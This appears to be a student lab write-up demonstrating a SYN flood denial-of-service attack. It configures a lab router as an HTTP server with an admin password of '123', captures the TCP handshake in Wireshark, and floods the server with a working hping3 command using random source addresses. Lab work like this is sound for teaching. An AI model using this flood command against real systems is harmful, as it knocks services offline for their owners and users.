
## DDOS attack: SYN Flood Attack
![schema1](../blob/ddos/photo_2024-11-23_17-10-33.jpg)
- First we config the router:

```
Router> en
Router#
Router# config t "or terminal"
Router(config)#
Router(config)# hostname SRV
SRV(config)#
SRV(config)# interface f0/0
SRV(config-if)#
SRV(config-if)# ip address dhcp
SRV(config-if)# no shutdown
SRV(config-if)# exit
SRV(config)# ip http ser
SRV(config)# ip http authentication local
SRV(config)# username admin privilege 15 password 123
SRV(config)# do wr
SRV(config)# ^Z (ctrl + Z)
SRV# show ip

```
- Let's find out our kali linux ip:
    ```
    $ sudo su
    ```
    then : 
    ```
    $ ifconfig
    ```
- now we can access the SRV throuhg browser:
![schema2](../blob/ddos/photo_2024-11-23_17-10-25.jpg)

- If we check wireshark we could capture syn , [syn, ack], and ack as the three way handshaking of TCP:
![schema3](../blob/ddos/SYN-ACK.png)

- Now we are ready to attack:
```
hping3 -c 15000 -d 120 -w 64 -p 80 --flood --rand-source 192.168.128.140 
```

- The results are shown below:
![schema4](../blob/ddos/photo_2024-11-23_17-10-40.jpg)
![schema5](../blob/ddos/photo_2024-11-23_17-10-43.jpg)
![schema6](../blob/ddos/photo_2024-11-23_17-10-47.jpg)
- Now if we stop the attack after a few seconds, SRV is back to normal again. (pay attention to the time!):
![schema7](../blob/ddos/photo_2024-11-23_17-10-51.jpg)

___
